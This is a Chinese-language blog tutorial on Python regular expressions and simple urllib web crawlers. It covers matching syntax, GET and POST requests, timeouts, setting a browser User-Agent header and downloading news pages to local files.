<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">'''</span><br><span class="line"><span class="bullet">.    </span>匹配除换行符外的任意字符</span><br><span class="line">^   匹配字符串开始的位置</span><br><span class="line">$    匹配结束位置</span><br><span class="line"><span class="bullet">*    </span>前面原子重复出现0次1次或多次</span><br><span class="line">?    前面原子重复出现0次1次</span><br><span class="line">+    前面原子刚好出现1次或多次</span><br><span class="line">&#123;n&#125; 前面原子恰好出现n次</span><br><span class="line">&#123;n,&#125; 前面的原子至少出现n次</span><br><span class="line">&#123;n,m&#125; 前面的原子至少出现n次至多出现m次</span><br><span class="line">|    模式原则符</span><br><span class="line">()   模式单元</span><br><span class="line">'''</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/5.png" alt><br><img src="/2020/03/09/zzbds/6.png" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re <span class="comment">#正则模块</span></span><br><span class="line">string=<span class="string">"dsfjjjjjjadhfjklh13135138498482.asdfsdfa"</span></span><br><span class="line">pat=<span class="string">"sfj*"</span> </span><br><span class="line">result=re.search(pat,string)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/7.png" alt><br><img src="/2020/03/09/zzbds/8.png" alt></p>
<h1 id="模式修正符"><a href="#模式修正符" class="headerlink" title="模式修正符"></a>模式修正符</h1><p>所谓的模式修正符，即可以再不改变正则表达式的情况下，通过模式修正符改变正则表达式的含义，从而实现一些匹配结果的调整等功能</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">I   忽略大小写</span></span><br><span class="line"><span class="string">M  多行匹配</span></span><br><span class="line"><span class="string">L   本地化识别匹配</span></span><br><span class="line"><span class="string">U   Unicode</span></span><br><span class="line"><span class="string">S    让.匹配包括换行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re <span class="comment">#正则模块</span></span><br><span class="line">string=<span class="string">"Python"</span></span><br><span class="line">pat=<span class="string">"pyt"</span></span><br><span class="line">result=re.search(pat,string,re.I)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/9.png" alt></p>
<h1 id="贪婪模式与懒惰模式"><a href="#贪婪模式与懒惰模式" class="headerlink" title="贪婪模式与懒惰模式"></a>贪婪模式与懒惰模式</h1><p>贪婪模式就是尽可能多的匹配，而懒惰模式就是尽可能少的匹配。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re <span class="comment">#正则模块</span></span><br><span class="line">string=<span class="string">"Pythonyafsdfasd"</span></span><br><span class="line">pat=<span class="string">"p.*y"</span>  <span class="comment">#贪婪模式，模糊</span></span><br><span class="line">result=re.search(pat,string,re.I)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/10.png" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re <span class="comment">#正则模块</span></span><br><span class="line">string=<span class="string">"Padsythonyafsdfasd"</span></span><br><span class="line">pat=<span class="string">"p.*?y"</span>  <span class="comment">#懒惰模式，精准</span></span><br><span class="line">result=re.search(pat,string,re.I)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/11.png" alt></p>
<h1 id="正则表达式函数"><a href="#正则表达式函数" class="headerlink" title="正则表达式函数"></a>正则表达式函数</h1><p>正则表达式函数有re.match()函数、re.search()函数、全局匹配函数、re.sub函数</p>
<h2 id="1-match"><a href="#1-match" class="headerlink" title="1.match"></a>1.match</h2><p>这个函数会从头开始匹配</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">string=<span class="string">"chengyizhou123123"</span></span><br><span class="line">pat=<span class="string">"g.*z"</span></span><br><span class="line">result=re.match(pat,string)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/12.png" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">string=<span class="string">"chengyizhou123123"</span></span><br><span class="line">pat=<span class="string">"c.*z"</span></span><br><span class="line">result=re.match(pat,string)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/13.png" alt></p>
<h2 id="2-search"><a href="#2-search" class="headerlink" title="2.search"></a>2.search</h2><p>从任何地方都可以匹配</p>
<h2 id="3-全局匹配函数"><a href="#3-全局匹配函数" class="headerlink" title="3.全局匹配函数"></a>3.全局匹配函数</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">string=<span class="string">"chengyizhocu12z3123"</span></span><br><span class="line">pat=<span class="string">"c.*?z"</span></span><br><span class="line"><span class="comment">#全局匹配格式re.compile(正则表达式).findall(数据)</span></span><br><span class="line">result=re.compile(pat).findall(string)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/14.png" alt></p>
<h1 id="常见正则实例"><a href="#常见正则实例" class="headerlink" title="常见正则实例"></a>常见正则实例</h1><p>匹配.com和.cn网址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">string=<span class="string">"&lt;a href='http://www.baidu.com'&gt;百度首页"</span></span><br><span class="line">pat=<span class="string">"[a-zA-Z]+://[^\s]*[.com|.cn]"</span><span class="comment"># </span></span><br><span class="line">result=re.compile(pat).findall(string)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/15.png" alt><br>匹配电话号码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">string=<span class="string">"asd0818-2565635fa014-12569856sd"</span></span><br><span class="line">pat=<span class="string">"\d&#123;4&#125;-\d&#123;7&#125;|\d&#123;3&#125;-\d&#123;8&#125;"</span></span><br><span class="line">result=re.compile(pat).findall(string)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/16.png" alt></p>
<h1 id="简单的爬虫编写"><a href="#简单的爬虫编写" class="headerlink" title="简单的爬虫编写"></a>简单的爬虫编写</h1><h2 id="使用urllib爬取CSDN首页"><a href="#使用urllib爬取CSDN首页" class="headerlink" title="使用urllib爬取CSDN首页"></a>使用urllib爬取CSDN首页</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">data=urllib.request.urlopen(<span class="string">"http://edu.csdn.net"</span>).read() <span class="comment">#打开网址并读取</span></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/17.png" alt></p>
<h2 id="爬取CSDN的一个课程页，并自动提取年月日"><a href="#爬取CSDN的一个课程页，并自动提取年月日" class="headerlink" title="爬取CSDN的一个课程页，并自动提取年月日"></a>爬取CSDN的一个课程页，并自动提取年月日</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">data=urllib.request.urlopen(<span class="string">"https://bbs.csdn.net/"</span>).read().decode(<span class="string">"utf-8"</span>) <span class="comment">#打开网址并读取</span></span><br><span class="line">pat=<span class="string">"&gt;\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;&lt;"</span></span><br><span class="line">result=re.compile(pat).findall(data)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/18.png" alt></p>
<h2 id="提取https-www-bilibili-com-read-cv2971239-里面的出版社信息"><a href="#提取https-www-bilibili-com-read-cv2971239-里面的出版社信息" class="headerlink" title="提取https://www.bilibili.com/read/cv2971239/里面的出版社信息"></a>提取<a href="https://www.bilibili.com/read/cv2971239/里面的出版社信息" target="_blank" rel="noopener">https://www.bilibili.com/read/cv2971239/里面的出版社信息</a></h2><p><img src="/2020/03/09/zzbds/19.png" alt><br>查看源码，发现出版社均为&lt;p&gt;.*?&lt;/p&gt;这种格式</p>
<p><img src="/2020/03/09/zzbds/20.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import re</span><br><span class="line">data=urllib.request.urlopen(<span class="string">"https://www.bilibili.com/read/cv2971239/"</span>).read().decode(<span class="string">"utf-8"</span>) <span class="comment">#打开网址并读取</span></span><br><span class="line">pat=<span class="string">'&lt;p&gt;(.*?)&lt;/p&gt;'</span>  <span class="comment">#懒惰模式   返回小括号里面的内容</span></span><br><span class="line">result=re.compile(pat).findall(data)</span><br><span class="line"><span class="keyword">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>稍微整理一下,并将其写入文件中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">data=urllib.request.urlopen(<span class="string">"https://www.bilibili.com/read/cv2971239/"</span>).read().decode(<span class="string">"utf-8"</span>,<span class="string">"ignore"</span>) <span class="comment">#打开网址并读取</span></span><br><span class="line">pat=<span class="string">'&lt;p&gt;(.*?)&lt;/p&gt;'</span>  <span class="comment">#懒惰模式   返回小括号里面的内容</span></span><br><span class="line">result=re.compile(pat).findall(data)</span><br><span class="line">fh=open(<span class="string">"C:\\Users\\华硕\\Desktop\\chubanshe.txt"</span>,<span class="string">'w+'</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(result)):</span><br><span class="line">    print(result[i])</span><br><span class="line">    fh.write(result[i]+<span class="string">"\n"</span>)</span><br><span class="line">fh.close()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/21.png" alt></p>
<h1 id="—————————"><a href="#—————————" class="headerlink" title="—————————-"></a>—————————-</h1><h1 id="浏览器伪装"><a href="#浏览器伪装" class="headerlink" title="浏览器伪装"></a>浏览器伪装</h1><h1 id="urllib基础"><a href="#urllib基础" class="headerlink" title="urllib基础"></a>urllib基础</h1><h2 id="urlretrieve"><a href="#urlretrieve" class="headerlink" title="urlretrieve()"></a>urlretrieve()</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="comment">#urlretrieve(网址,本地文件存储地址)   直接下载网页到本地</span></span><br><span class="line">urllib.request.urlretrieve(<span class="string">"http://www.baidu.com"</span>,<span class="string">"C:\\Users\\华硕\\Desktop\\浏览器.html"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/1.jpg" alt></p>
<h2 id="urlcleanup"><a href="#urlcleanup" class="headerlink" title="urlcleanup()"></a>urlcleanup()</h2><p>urlcleanup()的作用是清除缓存</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="comment">#urlretrieve(网址,本地文件存储地址)   直接下载网页到本地</span></span><br><span class="line">urllib.request.urlretrieve(<span class="string">"http://www.baidu.com"</span>,<span class="string">"C:\\Users\\华硕\\Desktop\\浏览器.txt"</span>)</span><br><span class="line">urllib,request.urlcleanup()<span class="comment">#清除缓存</span></span><br></pre></td></tr></table></figure>

<h2 id="info"><a href="#info" class="headerlink" title="info()"></a>info()</h2><p>info()可以提示当前爬取相应的情况</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">file=urllib.request.urlopen(<span class="string">"https://www.bilibili.com/read/cv2971239/"</span>)</span><br><span class="line"><span class="comment">#查看网页相应的简介信息</span></span><br><span class="line">print(file.info())</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/2.jpg" alt></p>
<h2 id="getcode"><a href="#getcode" class="headerlink" title="getcode"></a>getcode</h2><p>输出当前的状态码<br><img src="/2020/03/09/zzbds/3.jpg" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">file=urllib.request.urlopen(<span class="string">"https://www.bilibili.com/read/cv2971239/"</span>)</span><br><span class="line"><span class="comment">#输出当前的状态码</span></span><br><span class="line">print(file.getcode())</span><br></pre></td></tr></table></figure>

<p>200代表正常访问</p>
<h2 id="geturl"><a href="#geturl" class="headerlink" title="geturl()"></a>geturl()</h2><p>获取当前访问的url</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">file=urllib.request.urlopen(<span class="string">"https://www.bilibili.com/read/cv2971239/"</span>)</span><br><span class="line"><span class="comment">#获取当前访问的url</span></span><br><span class="line">print(file.geturl())</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/4.jpg" alt></p>
<h1 id="超时设置"><a href="#超时设置" class="headerlink" title="超时设置"></a>超时设置</h1><p>有的时候，访问一个网页，如果该网页长时间未响应，那么系统就会判断该网页超时了。但是，有的时候我们需要根据自己的需要来设置超时的时间值，比如，以10秒做为判断一个网页是否超时的标准。但是当timeout设置过低后就会出现异常</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file=urllib.request.urlopen(<span class="string">"https://www.bilibili.com/read/cv2971239/"</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">        print(len(file.read().decode(<span class="string">"utf-8"</span>)))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">        print(<span class="string">"出现异常"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/5.jpg" alt></p>
<h1 id="自动模拟http请求"><a href="#自动模拟http请求" class="headerlink" title="自动模拟http请求"></a>自动模拟http请求</h1><p>客户端如果要与服务器通信，需要通过http请求进行，http请求有很多种，常见的有get和post请求方式</p>
<h2 id="get请求"><a href="#get请求" class="headerlink" title="get请求"></a>get请求</h2><p>实现百度信息自动搜索<br><img src="/2020/03/09/zzbds/6.jpg" alt><br>进过观察发现百度是通过/s?wd=的方式请求，所以我们便可以构造url</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">keywd=<span class="string">"Python"</span></span><br><span class="line">url=<span class="string">"http://www.baidu.com/s?wd="</span>+keywd</span><br><span class="line">fh=urllib.request.urlopen(url).read().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">pat=<span class="string">"(.*?)&lt;"</span></span><br><span class="line">result=re.compile(pat).findall(fh)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/7.jpg" alt></p>
<p>爬取多页信息，观察每一页的url变化<br><img src="/2020/03/09/zzbds/8.jpg" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">keywd=<span class="string">"Python"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    </span><br><span class="line">    url=<span class="string">"http://www.baidu.com/s?wd="</span>+keywd+<span class="string">"&amp;page="</span>+str(i)</span><br><span class="line">    print(url)</span><br><span class="line">    fh=urllib.request.urlopen(url).read().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    pat=<span class="string">"(.*?)&lt;"</span></span><br><span class="line">    result=re.compile(pat).findall(fh)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/9.jpg" alt></p>
<h2 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h2><p><img src="/2020/03/09/zzbds/10.jpg" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">posturl=<span class="string">"https://www.iqianyue.com/mypost"</span></span><br><span class="line">postdata=urllib.parse.urlencode(&#123;</span><br><span class="line">            <span class="string">"name"</span>:<span class="string">"chengyizhou"</span>,</span><br><span class="line">             <span class="string">"pass"</span>:<span class="string">"sdafldkfjsadl;"</span>,</span><br><span class="line">    &#125;).encode(<span class="string">"utf-8"</span>)  <span class="comment">#使用字典的方式提交表单</span></span><br><span class="line"><span class="comment">#进行post，就需要使用urllib.request下的Request</span></span><br><span class="line">req=urllib.request.Request(posturl,postdata)</span><br><span class="line">result=urllib.request .urlopen(req).read().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">print(result)</span><br><span class="line">fh=open(<span class="string">"C:\\Users\\华硕\\Desktop\\post.html"</span>,<span class="string">"w"</span>)</span><br><span class="line">fh.write(result)</span><br><span class="line">fh.close()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/zzbds/11.jpg" alt></p>
<h1 id="浏览器伪装-1"><a href="#浏览器伪装-1" class="headerlink" title="浏览器伪装"></a>浏览器伪装</h1><p>由于有的服务器会对爬虫进行屏蔽，我们不能成功访问，这是我们就需要伪装成浏览器才能爬取成功 。我们可以使用urllib.request.build_opener()进行,也可以使用urllib.request.Request()下的add_header()实现浏览器的模拟<br>先找到该网页 的user-agent<br><img src="/2020/03/09/zzbds/12.jpg" alt></p>
<p>user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36<br><img src="/2020/03/09/zzbds/13.jpg" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">url=<span class="string">"https://read.douban.com/provider/all"</span></span><br><span class="line"><span class="comment">#头文件格式header=("User-Agent",具体用户代理值)</span></span><br><span class="line">headers=(<span class="string">"User-Agent"</span>,<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"</span>)</span><br><span class="line">opener=urllib.request.build_opener()</span><br><span class="line">opener.addheaders=[headers]</span><br><span class="line">data=opener.open(url).read()</span><br><span class="line">fh=open(<span class="string">"C:\\Users\\华硕\\Desktop\\ua.html"</span>,<span class="string">"wb"</span>)</span><br><span class="line">fh.write(data)</span><br><span class="line">fh.close()</span><br></pre></td></tr></table></figure>

<p>当我们去掉头信息的时候就禁止访问了<br><img src="/2020/03/09/zzbds/14.jpg" alt></p>
<h1 id="python新闻爬虫实战"><a href="#python新闻爬虫实战" class="headerlink" title="python新闻爬虫实战"></a>python新闻爬虫实战</h1><p>先爬首页，通过正则表达式获取所有新闻链接，然后依次爬取各新闻，并存储到本地</p>
<p><img src="/2020/03/09/zzbds/15.jpg" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">"http://news.szhk.com/"</span></span><br><span class="line">data=urllib.request.urlopen(url).read().decode(<span class="string">"UTF-8"</span>,<span class="string">"ignore"</span>)</span><br><span class="line">pat=<span class="string">'&lt;a target="_blank" href="(.*?)"&gt;'</span></span><br><span class="line">link=re.compile(pat).findall(data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(link)):</span><br><span class="line">    thislink=link[i]</span><br><span class="line">    thispage=urllib.request.urlopen(thislink).read().decode(<span class="string">"UTF-8"</span>)</span><br><span class="line">    pat2=<span class="string">"&lt;frame src=(.*?)&gt;"</span></span><br><span class="line">    isframe=re.compile(pat2).findall(thispage)</span><br><span class="line">    <span class="keyword">if</span>(len(isframe)==<span class="number">0</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        urllib.request.urlretrieve(thislink,<span class="string">"C:\\Users\\华硕\\Desktop\\data\\"</span>+str(i)+<span class="string">".html"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flink=isframe[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        urllib.request.urlretrieve(flink,<span class="string">"C:\\Users\\华硕\\Desktop\\data\\"</span>+str(i)+<span class="string">".html"</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>python爬虫</tag>
      </tags>
  </entry>
</search>
